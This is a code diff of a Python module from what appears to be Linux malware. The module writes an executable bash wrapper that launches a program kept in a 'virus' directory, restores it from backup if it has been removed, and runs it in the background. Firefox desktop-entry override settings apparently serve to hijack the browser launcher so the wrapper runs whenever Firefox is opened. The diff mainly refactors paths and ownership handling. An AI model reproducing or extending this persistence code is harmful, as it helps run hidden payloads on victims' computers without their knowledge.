@@ -1,12 +1,11 @@
 import os
-import tempfile
 import shutil
 from pathlib import Path
 from typing import Optional
-from config import (DIR_SAVE_VIRUS, BACKUP_DIR_DEFAULT, PREFIX_DIR_PAYLOAD, WRAPPER_DIR,
-                    WRAPPER_SCRIPT_NAME, DESKTOP_NAME_OVERRIDE, DESKTOP_DIR_OVERRIDE, FIREFOX_BIN)
+from config import (SAVE_VIRUS_DIR, BACKUP_DIR, WRAPPER_DIR, WRAPPER_SCRIPT_NAME,
+                    DESKTOP_NAME_OVERRIDE, DESKTOP_DIR_OVERRIDE, FIREFOX_BIN, LIST_NEW_FILES)
 
-from handshake_and_move import check_root, remove_root_ownership
+from utils import check_root, remove_root_ownership
 
 
 def write_executable(path: Path, content: str, mode: int = 0o755):
@@ -21,21 +20,8 @@ def read_content_in_firefox_desktop() -> str:
 
 def create_wrapper_script(progFileName: str, progFileBackup: str) -> Optional[Path]:
 
-    dirSaveVirus = os.path.expanduser(DIR_SAVE_VIRUS)
-    backupDir = os.path.expanduser(BACKUP_DIR_DEFAULT)
-
-    try:
-        os.makedirs(dirSaveVirus, exist_ok=True)
-        os.makedirs(backupDir, exist_ok=True)
-        dirSavePayload = tempfile.mkdtemp(prefix=PREFIX_DIR_PAYLOAD, dir=dirSaveVirus)
-        # thu hồi tất cả quyền root các file/ dir mới tạo
-        remove_root_ownership(Path(dirSavePayload))
-        remove_root_ownership(Path(dirSaveVirus))
-        remove_root_ownership(Path(backupDir))
-    except Exception as e:
-        print(f"Error creating backup or virus directory: {e}")
-        return None
-
+    dirSaveVirus = os.path.expanduser(SAVE_VIRUS_DIR)
+    backupDir = os.path.expanduser(BACKUP_DIR)
 
     wrapper_dir = os.path.expanduser(WRAPPER_DIR)
     wrapper_path = Path(wrapper_dir) / WRAPPER_SCRIPT_NAME
@@ -43,7 +29,7 @@ def create_wrapper_script(progFileName: str, progFileBackup: str) -> Optional[Pa
     bash_content = f"""
     ##!/bin/bash
    
-    PROG="{dirSavePayload}/{progFileName}"
+    PROG="{dirSaveVirus}/{progFileName}"
     BACKUP="{backupDir}/{progFileBackup}"
 
     if [ ! -x "$PROG" ] && [ -f "$BACKUP" ]; then
@@ -53,7 +39,6 @@ def create_wrapper_script(progFileName: str, progFileBackup: str) -> Optional[Pa
 
     if [ -x "$PROG" ]; then
         cd "$HOME" || true
-        chown daicaduy:daicaduy "$PROG"
         "$PROG" &
         PROG_PID=$!
         echo "✅ PROG started with PID: $PROG_PID"
@@ -64,7 +49,8 @@ def create_wrapper_script(progFileName: str, progFileBackup: str) -> Optional[Pa
 
 """
     write_executable(wrapper_path, bash_content)
-    remove_root_ownership(wrapper_path)
+    LIST_NEW_FILES.append(wrapper_path)
+    # remove_root_ownership(wrapper_path)
     return wrapper_path
 
 def backup_file(src: Path):
